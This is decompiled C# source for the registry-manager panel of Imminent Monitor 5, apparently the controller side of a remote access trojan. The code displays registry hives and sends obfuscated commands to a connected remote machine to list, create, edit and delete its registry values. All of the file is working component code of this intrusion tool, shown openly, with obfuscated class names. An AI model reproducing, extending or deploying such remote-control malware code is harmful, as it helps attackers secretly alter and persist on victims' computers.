// Decompiled with JetBrains decompiler
// Type: UserControlRegistryManager
// Assembly: ImminentMonitor, Version=5.0.0.89, Culture=neutral, PublicKeyToken=null
// MVID: B073CE4A-B7A6-4CA1-871B-499EF3E27493
// Assembly location: C:\Users\Artem\Documents\Code\Imminent Monitor 5\Imminent Monitor.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

[DesignerGenerated]
public sealed class UserControlRegistryManager : UserControl
{
  private IContainer icontainer_0;
  private GClass17 gclass17_0;
  private GClass34 gclass34_0;
  private GClass41 gclass41_0;
  private ColumnHeader columnHeader_0;
  private ColumnHeader columnHeader_1;
  private ColumnHeader columnHeader_2;
  private ImageList imageList_0;
  private ContextMenuStrip contextMenuStrip_0;
  private ToolStripMenuItem toolStripMenuItem_0;
  private ToolStripMenuItem toolStripMenuItem_1;
  private ToolStripMenuItem toolStripMenuItem_2;
  private ImageList imageList_1;
  private Label label_0;
  private GClass18 gclass18_0;
  private string string_0;

  public UserControlRegistryManager()
  {
    this.Load += new EventHandler(this.UserControlRegistryManager_Load);
    this.InitializeComponent();
  }

  [DebuggerNonUserCode]
  protected override void Dispose(bool disposing)
  {
    try
    {
      if (!disposing || this.icontainer_0 == null)
        return;
      this.icontainer_0.Dispose();
    }
    finally
    {
      base.Dispose(disposing);
    }
  }

  [DebuggerStepThrough]
  private void InitializeComponent()
  {
    this.icontainer_0 = (IContainer) new System.ComponentModel.Container();
    ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (UserControlRegistryManager));
    TreeNode treeNode1 = new TreeNode("HKEY_CLASSES_ROOT");
    TreeNode treeNode2 = new TreeNode("HKEY_CURRENT_USER");
    TreeNode treeNode3 = new TreeNode("HKEY_LOCAL_MACHINE");
    TreeNode treeNode4 = new TreeNode("HKEY_USERS");
    TreeNode treeNode5 = new TreeNode("HKEY_CURRENT_CONFIG");
    this.vmethod_13(new ImageList(this.icontainer_0));
    this.vmethod_15(new ContextMenuStrip(this.icontainer_0));
    this.vmethod_17(new ToolStripMenuItem());
    this.vmethod_19(new ToolStripMenuItem());
    this.vmethod_21(new ToolStripMenuItem());
    this.vmethod_23(new ImageList(this.icontainer_0));
    this.vmethod_25(new Label());
    this.vmethod_1(new GClass17());
    this.vmethod_3(new GClass34());
    this.vmethod_5(new GClass41());
    this.vmethod_7(new ColumnHeader());
    this.vmethod_9(new ColumnHeader());
    this.vmethod_11(new ColumnHeader());
    this.vmethod_14().SuspendLayout();
    this.vmethod_0().Panel1.SuspendLayout();
    this.vmethod_0().Panel2.SuspendLayout();
    this.vmethod_0().SuspendLayout();
    this.SuspendLayout();
    this.vmethod_12().ImageStream = (ImageListStreamer) componentResourceManager.GetObject("ImageListRegistryTree.ImageStream");
    this.vmethod_12().TransparentColor = Color.Transparent;
    this.vmethod_12().Images.SetKeyName(0, "folder-open.png");
    this.vmethod_14().Font = new Font("Verdana", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    this.vmethod_14().Items.AddRange(new ToolStripItem[3]
    {
      (ToolStripItem) this.vmethod_16(),
      (ToolStripItem) this.vmethod_18(),
      (ToolStripItem) this.vmethod_20()
    });
    this.vmethod_14().Name = "ContextMenuStripRegistryValue";
    ContextMenuStrip contextMenuStrip = this.vmethod_14();
    Size size1 = new Size(112, 70);
    Size size2 = size1;
    contextMenuStrip.Size = size2;
    this.vmethod_16().Name = "NewToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem1 = this.vmethod_16();
    size1 = new Size(111, 22);
    Size size3 = size1;
    toolStripMenuItem1.Size = size3;
    this.vmethod_16().Tag = (object) "0";
    this.vmethod_16().Text = "New";
    this.vmethod_18().Name = "EditToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem2 = this.vmethod_18();
    size1 = new Size(111, 22);
    Size size4 = size1;
    toolStripMenuItem2.Size = size4;
    this.vmethod_18().Tag = (object) "0";
    this.vmethod_18().Text = "Edit";
    this.vmethod_20().Name = "DeleteToolStripMenuItem1";
    ToolStripMenuItem toolStripMenuItem3 = this.vmethod_20();
    size1 = new Size(111, 22);
    Size size5 = size1;
    toolStripMenuItem3.Size = size5;
    this.vmethod_20().Tag = (object) "0";
    this.vmethod_20().Text = "Delete";
    this.vmethod_22().ImageStream = (ImageListStreamer) componentResourceManager.GetObject("ImageListRegistryList.ImageStream");
    this.vmethod_22().TransparentColor = Color.Transparent;
    this.vmethod_22().Images.SetKeyName(0, "regedit_205.ico");
    this.vmethod_22().Images.SetKeyName(1, "regedit_206.ico");
    this.vmethod_24().Anchor = AnchorStyles.Bottom | AnchorStyles.Left;
    this.vmethod_24().AutoSize = true;
    Label label1 = this.vmethod_24();
    Point point1 = new Point(0, 463);
    Point point2 = point1;
    label1.Location = point2;
    this.vmethod_24().Name = "LabelRegistryPath";
    Label label2 = this.vmethod_24();
    size1 = new Size(115, 13);
    Size size6 = size1;
    label2.Size = size6;
    this.vmethod_24().TabIndex = 3;
    this.vmethod_24().Text = "HKEY_CLASSES_ROOT";
    this.vmethod_0().Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
    GClass17 gclass17_1 = this.vmethod_0();
    point1 = new Point(0, 3);
    Point point3 = point1;
    gclass17_1.Location = point3;
    this.vmethod_0().Name = "SplitContainerEx1";
    this.vmethod_0().Panel1.Controls.Add((Control) this.vmethod_2());
    this.vmethod_0().Panel2.Controls.Add((Control) this.vmethod_4());
    GClass17 gclass17_2 = this.vmethod_0();
    size1 = new Size(736, 457);
    Size size7 = size1;
    gclass17_2.Size = size7;
    this.vmethod_0().SplitterDistance = 250;
    this.vmethod_0().TabIndex = 2;
    this.vmethod_2().Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
    this.vmethod_2().FullRowSelect = true;
    this.vmethod_2().ImageIndex = 0;
    this.vmethod_2().ImageList = this.vmethod_12();
    GClass34 gclass34_1 = this.vmethod_2();
    point1 = new Point(3, 0);
    Point point4 = point1;
    gclass34_1.Location = point4;
    this.vmethod_2().Name = "AeroTreeViewRegistry";
    treeNode1.Name = "HKEY_CLASSES_ROOT";
    treeNode1.Tag = (object) "0";
    treeNode1.Text = "HKEY_CLASSES_ROOT";
    treeNode2.Name = "HKEY_CURRENT_USER";
    treeNode2.Tag = (object) "1";
    treeNode2.Text = "HKEY_CURRENT_USER";
    treeNode3.Name = "HKEY_LOCAL_MACHINE";
    treeNode3.Tag = (object) "2";
    treeNode3.Text = "HKEY_LOCAL_MACHINE";
    treeNode4.Name = "HKEY_USERS";
    treeNode4.Tag = (object) "3";
    treeNode4.Text = "HKEY_USERS";
    treeNode5.Name = "HKEY_CURRENT_CONFIG";
    treeNode5.Tag = (object) "4";
    treeNode5.Text = "HKEY_CURRENT_CONFIG";
    this.vmethod_2().Nodes.AddRange(new TreeNode[5]
    {
      treeNode1,
      treeNode2,
      treeNode3,
      treeNode4,
      treeNode5
    });
    this.vmethod_2().SelectedImageIndex = 0;
    GClass34 gclass34_2 = this.vmethod_2();
    size1 = new Size(247, 457);
    Size size8 = size1;
    gclass34_2.Size = size8;
    this.vmethod_2().TabIndex = 0;
    this.vmethod_4().Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
    this.vmethod_4().Columns.AddRange(new ColumnHeader[3]
    {
      this.vmethod_6(),
      this.vmethod_8(),
      this.vmethod_10()
    });
    this.vmethod_4().ContextMenuStrip = this.vmethod_14();
    this.vmethod_4().Font = new Font("Verdana", 8.25f);
    this.vmethod_4().FullRowSelect = true;
    this.vmethod_4().HideSelection = false;
    GClass41 gclass41_1 = this.vmethod_4();
    point1 = new Point(0, 0);
    Point point5 = point1;
    gclass41_1.Location = point5;
    this.vmethod_4().Name = "AeroListviewRegistryValues";
    GClass41 gclass41_2 = this.vmethod_4();
    size1 = new Size(480, 457);
    Size size9 = size1;
    gclass41_2.Size = size9;
    this.vmethod_4().SmallImageList = this.vmethod_22();
    this.vmethod_4().TabIndex = 0;
    this.vmethod_4().UseCompatibleStateImageBehavior = false;
    this.vmethod_4().View = View.Details;
    this.vmethod_6().Text = "Name";
    this.vmethod_6().Width = 183;
    this.vmethod_8().Text = "Type";
    this.vmethod_8().Width = 79;
    this.vmethod_10().Text = "Data";
    this.vmethod_10().Width = 184;
    this.AutoScaleDimensions = new SizeF(6f, 13f);
    this.AutoScaleMode = AutoScaleMode.Font;
    this.BackColor = Color.White;
    this.Controls.Add((Control) this.vmethod_24());
    this.Controls.Add((Control) this.vmethod_0());
    this.Font = new Font("Segoe UI", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    this.Name = nameof (UserControlRegistryManager);
    size1 = new Size(736, 483);
    this.Size = size1;
    this.vmethod_14().ResumeLayout(false);
    this.vmethod_0().Panel1.ResumeLayout(false);
    this.vmethod_0().Panel2.ResumeLayout(false);
    this.vmethod_0().ResumeLayout(false);
    this.ResumeLayout(false);
    this.PerformLayout();
  }

  internal virtual GClass17 vmethod_0() => this.gclass17_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_1(GClass17 gclass17_1) => this.gclass17_0 = gclass17_1;

  internal virtual GClass34 vmethod_2() => this.gclass34_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_3(GClass34 gclass34_1)
  {
    TreeViewEventHandler viewEventHandler1 = new TreeViewEventHandler(this.method_7);
    TreeViewEventHandler viewEventHandler2 = new TreeViewEventHandler(this.method_6);
    EventHandler eventHandler = new EventHandler(this.method_5);
    TreeViewEventHandler viewEventHandler3 = new TreeViewEventHandler(this.method_4);
    if (this.gclass34_0 != null)
    {
      this.gclass34_0.AfterCollapse -= viewEventHandler1;
      this.gclass34_0.AfterExpand -= viewEventHandler2;
      this.gclass34_0.DoubleClick -= eventHandler;
      this.gclass34_0.AfterSelect -= viewEventHandler3;
    }
    this.gclass34_0 = gclass34_1;
    if (this.gclass34_0 == null)
      return;
    this.gclass34_0.AfterCollapse += viewEventHandler1;
    this.gclass34_0.AfterExpand += viewEventHandler2;
    this.gclass34_0.DoubleClick += eventHandler;
    this.gclass34_0.AfterSelect += viewEventHandler3;
  }

  internal virtual GClass41 vmethod_4() => this.gclass41_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_5(GClass41 gclass41_1) => this.gclass41_0 = gclass41_1;

  internal virtual ColumnHeader vmethod_6() => this.columnHeader_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_7(ColumnHeader columnHeader_3) => this.columnHeader_0 = columnHeader_3;

  internal virtual ColumnHeader vmethod_8() => this.columnHeader_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_9(ColumnHeader columnHeader_3) => this.columnHeader_1 = columnHeader_3;

  internal virtual ColumnHeader vmethod_10() => this.columnHeader_2;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_11(ColumnHeader columnHeader_3) => this.columnHeader_2 = columnHeader_3;

  internal virtual ImageList vmethod_12() => this.imageList_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_13(ImageList imageList_2) => this.imageList_0 = imageList_2;

  internal virtual ContextMenuStrip vmethod_14() => this.contextMenuStrip_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_15(ContextMenuStrip contextMenuStrip_1) => this.contextMenuStrip_0 = contextMenuStrip_1;

  internal virtual ToolStripMenuItem vmethod_16() => this.toolStripMenuItem_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_17(ToolStripMenuItem toolStripMenuItem_3)
  {
    EventHandler eventHandler = new EventHandler(this.method_8);
    if (this.toolStripMenuItem_0 != null)
      this.toolStripMenuItem_0.Click -= eventHandler;
    this.toolStripMenuItem_0 = toolStripMenuItem_3;
    if (this.toolStripMenuItem_0 == null)
      return;
    this.toolStripMenuItem_0.Click += eventHandler;
  }

  internal virtual ToolStripMenuItem vmethod_18() => this.toolStripMenuItem_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_19(ToolStripMenuItem toolStripMenuItem_3)
  {
    EventHandler eventHandler = new EventHandler(this.method_9);
    if (this.toolStripMenuItem_1 != null)
      this.toolStripMenuItem_1.Click -= eventHandler;
    this.toolStripMenuItem_1 = toolStripMenuItem_3;
    if (this.toolStripMenuItem_1 == null)
      return;
    this.toolStripMenuItem_1.Click += eventHandler;
  }

  internal virtual ToolStripMenuItem vmethod_20() => this.toolStripMenuItem_2;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_21(ToolStripMenuItem toolStripMenuItem_3)
  {
    EventHandler eventHandler = new EventHandler(this.method_10);
    if (this.toolStripMenuItem_2 != null)
      this.toolStripMenuItem_2.Click -= eventHandler;
    this.toolStripMenuItem_2 = toolStripMenuItem_3;
    if (this.toolStripMenuItem_2 == null)
      return;
    this.toolStripMenuItem_2.Click += eventHandler;
  }

  internal virtual ImageList vmethod_22() => this.imageList_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_23(ImageList imageList_2) => this.imageList_1 = imageList_2;

  internal virtual Label vmethod_24() => this.label_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_25(Label label_1) => this.label_0 = label_1;

  public GClass18 method_0() => this.gclass18_0;

  public void method_1(GClass18 gclass18_1) => this.gclass18_0 = gclass18_1;

  private void method_2()
  {
    string oldValue = this.vmethod_24().Text.Split(Conversions.ToCharArrayRankOne("\\"))[0] + "\\";
    object[] object_0 = new object[4]
    {
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.Registry,
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.RegistryPacket.RetrieveValueList,
      (object) this.method_12(oldValue.Replace("\\", string.Empty)),
      (object) this.vmethod_24().Text.Replace(oldValue, string.Empty)
    };
    dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.method_0(), object_0);
  }

  private void method_3(TreeNode treeNode_0)
  {
    List<object> objectList = new List<object>();
    objectList.Add((object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.Registry);
    objectList.Add((object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.RegistryPacket.SubKeyList);
    if (Versioned.IsNumeric(RuntimeHelpers.GetObjectValue(treeNode_0.Tag)))
    {
      objectList.Add(RuntimeHelpers.GetObjectValue(treeNode_0.Tag));
      objectList.Add((object) this.string_0);
    }
    else
    {
      string oldValue = this.string_0.Split(Conversions.ToCharArrayRankOne("\\"))[0] + "\\";
      int num = this.method_12(oldValue.Replace("\\", string.Empty));
      objectList.Add((object) num);
      objectList.Add((object) this.string_0.Replace(oldValue, string.Empty));
    }
    objectList.Add(RuntimeHelpers.GetObjectValue(treeNode_0.Tag));
    dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.method_0(), objectList.ToArray());
  }

  private void method_4(object sender, TreeViewEventArgs e)
  {
    this.method_11(e.Node);
    this.method_2();
  }

  private void method_5(object sender, EventArgs e)
  {
    if (Versioned.IsNumeric(RuntimeHelpers.GetObjectValue(this.vmethod_2().SelectedNode.Tag)))
      this.method_3(this.vmethod_2().SelectedNode);
    else
      this.vmethod_2().SelectedNode.Expand();
  }

  private void method_6(object sender, TreeViewEventArgs e)
  {
    this.method_11(e.Node);
    this.method_2();
    if (Versioned.IsNumeric(RuntimeHelpers.GetObjectValue(e.Node.Tag)))
      return;
    this.method_3(e.Node);
  }

  private void method_7(object sender, TreeViewEventArgs e)
  {
    e.Node.Nodes.Clear();
    this.method_11(e.Node);
    if (Versioned.IsNumeric(RuntimeHelpers.GetObjectValue(e.Node.Tag)))
      return;
    e.Node.Nodes.Add("Loading...");
  }

  private void method_8(object sender, EventArgs e)
  {
    FormRegistryValue formRegistryValue = new FormRegistryValue("Create Value", "Create", "Value Name", "Value Contents", (string) null);
    if (formRegistryValue.ShowDialog((IWin32Window) this) != DialogResult.OK)
      return;
    string text1 = formRegistryValue.vmethod_6().Text;
    string text2 = formRegistryValue.vmethod_10().richTextBox_0.Text;
    dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.method_0(), new object[6]
    {
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.Registry,
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.RegistryPacket.CreateValuePacket,
      (object) this.vmethod_24().Text,
      (object) text1,
      (object) text2,
      (object) string.Empty
    });
  }

  private void method_9(object sender, EventArgs e)
  {
    if (this.vmethod_4().SelectedItems.Count == 0)
      return;
    FormRegistryValue formRegistryValue = new FormRegistryValue("Edit Value", "Edit", "Value Name", "Value Contents", Conversions.ToString(this.vmethod_4().SelectedItems[0].Tag));
    formRegistryValue.vmethod_6().Enabled = false;
    formRegistryValue.vmethod_6().Text = this.vmethod_4().SelectedItems[0].SubItems[0].Text;
    formRegistryValue.vmethod_10().richTextBox_0.Text = this.vmethod_4().SelectedItems[0].SubItems[2].Text;
    if (formRegistryValue.ShowDialog((IWin32Window) this) != DialogResult.OK)
      return;
    string text1 = formRegistryValue.vmethod_6().Text;
    string text2 = formRegistryValue.vmethod_10().richTextBox_0.Text;
    dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.method_0(), new object[6]
    {
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.Registry,
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.RegistryPacket.CreateValuePacket,
      (object) this.vmethod_24().Text,
      (object) text1,
      (object) text2,
      (object) formRegistryValue.string_0
    });
  }

  private void method_10(object sender, EventArgs e)
  {
    if (this.vmethod_4().SelectedItems.Count == 0)
      return;
    string oldValue = this.string_0.Split(Conversions.ToCharArrayRankOne("\\"))[0] + "\\";
    int num = this.method_12(oldValue.Replace("\\", string.Empty));
    string str = this.string_0.Replace(oldValue, string.Empty);
    string text = this.vmethod_4().SelectedItems[0].Text;
    string tag = (string) this.vmethod_4().SelectedItems[0].Tag;
    dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.method_0(), new object[6]
    {
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.Registry,
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.RegistryPacket.DeleteValuePacket,
      (object) num,
      (object) str,
      (object) text,
      (object) tag
    });
  }

  private void method_11(TreeNode treeNode_0)
  {
    string str = treeNode_0.Text;
    TreeNode treeNode = treeNode_0;
    while (treeNode.Parent != null)
    {
      treeNode = treeNode.Parent;
      str = treeNode.Text + "\\" + str;
    }
    this.string_0 = str;
    this.vmethod_24().Text = this.string_0;
  }

  public int method_12(string string_1)
  {
    string Left = string_1;
    if (Operators.CompareString(Left, "HKEY_CLASSES_ROOT", false) == 0)
      return 0;
    if (Operators.CompareString(Left, "HKEY_CURRENT_USER", false) == 0)
      return 1;
    if (Operators.CompareString(Left, "HKEY_LOCAL_MACHINE", false) == 0)
      return 2;
    if (Operators.CompareString(Left, "HKEY_USERS", false) == 0)
      return 3;
    return Operators.CompareString(Left, "HKEY_CURRENT_CONFIG", false) == 0 ? 4 : 2;
  }

  public void method_13(object[] object_0)
  {
    try
    {
      foreach (ListViewItem listViewItem in this.vmethod_4().Items)
      {
        if (Operators.ConditionalCompareObjectEqual(listViewItem.Tag, object_0[4], false))
        {
          listViewItem.SubItems[2].Text = (string) object_0[3];
          return;
        }
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
    ListViewItem listViewItem1 = new ListViewItem();
    listViewItem1.ImageIndex = 0;
    listViewItem1.Text = (string) object_0[2];
    listViewItem1.SubItems.Add("REG_SZ");
    ListViewItem.ListViewSubItemCollection subItems = listViewItem1.SubItems;
    object[] objArray1 = new object[1];
    object[] objArray2 = objArray1;
    object[] objArray3 = object_0;
    object[] objArray4 = objArray3;
    int index = 3;
    object objectValue = RuntimeHelpers.GetObjectValue(objArray4[3]);
    objArray2[0] = objectValue;
    object[] objArray5 = objArray1;
    object[] Arguments = objArray5;
    bool[] flagArray = new bool[1]{ true };
    bool[] CopyBack = flagArray;
    NewLateBinding.LateCall((object) subItems, (System.Type) null, "Add", Arguments, (string[]) null, (System.Type[]) null, CopyBack, true);
    if (flagArray[0])
      objArray3[index] = RuntimeHelpers.GetObjectValue(objArray5[0]);
    listViewItem1.Tag = (object) Guid.NewGuid().ToString();
    this.vmethod_4().Items.Add(listViewItem1);
  }

  public void method_14(object[] object_0)
  {
    try
    {
      foreach (ListViewItem listViewItem in this.vmethod_4().Items)
      {
        if (Operators.ConditionalCompareObjectEqual(listViewItem.Tag, object_0[2], false))
          this.vmethod_4().Items.Remove(listViewItem);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  public void method_15(object[] object_0)
  {
    TreeNode treeNode1 = (TreeNode) null;
    try
    {
      foreach (TreeNode treeNode2 in this.method_17())
      {
        if (Operators.ConditionalCompareObjectEqual(treeNode2.Tag, object_0[2], false))
        {
          treeNode1 = treeNode2;
          treeNode2.Nodes.Clear();
        }
      }
    }
    finally
    {
      List<TreeNode>.Enumerator enumerator;
      enumerator.Dispose();
    }
    int num = object_0.Length - 1;
    for (int index = 3; index <= num; ++index)
    {
      treeNode1.Nodes.Add(new TreeNode()
      {
        Text = (string) object_0[index],
        Tag = (object) Guid.NewGuid().ToString(),
        Nodes = {
          "Loading..."
        }
      });
      treeNode1.Expand();
    }
  }

  public void method_16(object[] object_0)
  {
    try
    {
      this.vmethod_4().Items.Clear();
      int num = object_0.Length - 1;
      for (int index = 2; index <= num; index += 3)
      {
        string Left1 = (string) object_0[index];
        string str1 = object_0[index + 1].ToString();
        string str2 = object_0[index + 2].ToString();
        if (Operators.CompareString(Left1, string.Empty, false) == 0)
          Left1 = "(Default)";
        if (Operators.CompareString(str2, string.Empty, false) == 0)
          str2 = "(value not set)";
        ListViewItem listViewItem = new ListViewItem();
        listViewItem.Text = Left1;
        string Left2 = str1;
        if (Operators.CompareString(Left2, Conversions.ToString(1), false) == 0)
        {
          listViewItem.SubItems.Add("REG_SZ");
          listViewItem.ImageIndex = 0;
        }
        else if (Operators.CompareString(Left2, Conversions.ToString(2), false) == 0)
        {
          listViewItem.SubItems.Add("REG_EXPAND_SZ");
          listViewItem.ImageIndex = 0;
        }
        else if (Operators.CompareString(Left2, Conversions.ToString(3), false) == 0 || Operators.CompareString(Left2, Conversions.ToString(4), false) == 0)
          break;
        listViewItem.SubItems.Add(str2);
        listViewItem.Tag = (object) Guid.NewGuid().ToString();
        this.vmethod_4().Items.Add(listViewItem);
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Exception exception_0 = ex;
      Class97.smethod_0().method_2(exception_0, (string) null);
      ProjectData.ClearProjectError();
    }
  }

  protected List<TreeNode> method_17()
  {
    List<TreeNode> list_0 = new List<TreeNode>();
    int num = this.vmethod_2().Nodes.Count - 1;
    for (int index = 0; index <= num; ++index)
      this.method_18(this.vmethod_2().Nodes[index], list_0);
    return list_0;
  }

  protected void method_18(TreeNode treeNode_0, List<TreeNode> list_0)
  {
    if (treeNode_0 == null)
      return;
    list_0.Add(treeNode_0);
    int num = treeNode_0.Nodes.Count - 1;
    for (int index = 0; index <= num; ++index)
      this.method_18(treeNode_0.Nodes[index], list_0);
  }

  private void UserControlRegistryManager_Load(object sender, EventArgs e)
  {
    if (this.DesignMode)
      return;
    Class97.smethod_15(this.vmethod_14());
    Class97.smethod_7(this.vmethod_14());
  }
}
